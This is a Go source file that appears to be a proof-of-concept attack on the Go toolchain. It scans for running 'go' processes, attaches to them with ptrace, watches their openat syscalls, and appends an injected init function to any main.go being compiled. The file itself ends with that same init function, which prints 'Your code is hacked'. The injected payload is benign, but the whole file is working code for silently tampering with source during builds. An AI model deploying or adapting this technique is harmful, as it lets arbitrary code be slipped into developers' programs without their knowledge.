package main

import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
	sec "github.com/seccomp/libseccomp-golang"
)

func main() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		os.Exit(1)
	}()
	for {
		findproc()
	}
}

func findproc() {
	procs, err := ps.Processes()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, proc := range procs {
		exec := proc.Executable()

		if exec == "go" {
			eh, _ := os.FindProcess(proc.Pid())
			exploit(eh.Pid)

		}
	}
}

func exploit(pid int) {
	var regs syscall.PtraceRegs
	var err error
	exit := true

	_ = syscall.PtraceAttach(pid)

	for {
		if exit {
			err = syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				break
			}

			// Uncomment to show each syscall as it's called
			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
			fmt.Println(name)

			if name == "openat" {

				path, err := getOpenAtPath(pid, regs)
				if err != nil {
					fmt.Println(err)
				}

				if strings.Contains(path, "main.go") {
					fmt.Printf("Path: %s\n", path)
					fmt.Printf("Name: %s\n", name)
					_ = patchfile(path)

				}

			}

		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			break
		}

		_, err = syscall.Wait4(pid, nil, 0, nil)
		if err != nil {
			break
		}

		exit = !exit
	}

}

func patchfile(path string) (original []byte) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	fmt.Println(path)

	// add init function
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return data
	}

	hackerstring := `
func init() {
	fmt.Println("Your code is hacked")
}
	`

	if _, err := f.WriteString(hackerstring); err != nil {
		log.Println(err)
	}

	return data

}

func clean(data []byte, path string) {
	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Fatal(err)
	}

	f.Write(data)
	f.Close()

}

func getOpenAtPath(pid int, regs syscall.PtraceRegs) (string, error) {
	path, err := readString(pid, uintptr(regs.Rsi))
	if err != nil {
		return "", err
	}
	return path, nil
}

func readString(pid int, addr uintptr) (string, error) {
	data := make([]byte, 4096)
	bytes_copied, _ := syscall.PtracePeekData(pid, addr, data)
	if bytes_copied == 0 {
		return "", fmt.Errorf("0-byte string returned")
	}
	str := C.GoString((*C.char)(C.CBytes(data)))
	return str, nil
}

func init() {
	fmt.Println("Your code is hacked")
}
	